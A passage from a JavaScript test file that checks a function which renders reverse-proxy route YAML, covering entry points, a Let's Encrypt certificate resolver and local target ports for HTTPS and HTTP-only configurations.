    targetPort: 3000,
    tls: "letsencrypt",
  })
  assert.match(yml, /entryPoints: \[web\]/)
  assert.match(yml, /entryPoints: \[websecure\]/)
  assert.match(yml, /certResolver: letsencrypt/)
  assert.match(yml, /127\.0\.0\.1:3000/)
  const httpOnly = renderDomainRouteYaml({
    projectSlug: "web",
    projectId: "projxxxxxx",
    hostname: "app.example.com",
    targetPort: 8080,
    tls: "http",
  })
  assert.match(httpOnly, /entryPoints: \[web\]/)
  assert.doesNotMatch(httpOnly, /websecure/)
})

console.log(`\n  ${n} checks passed ✓`)
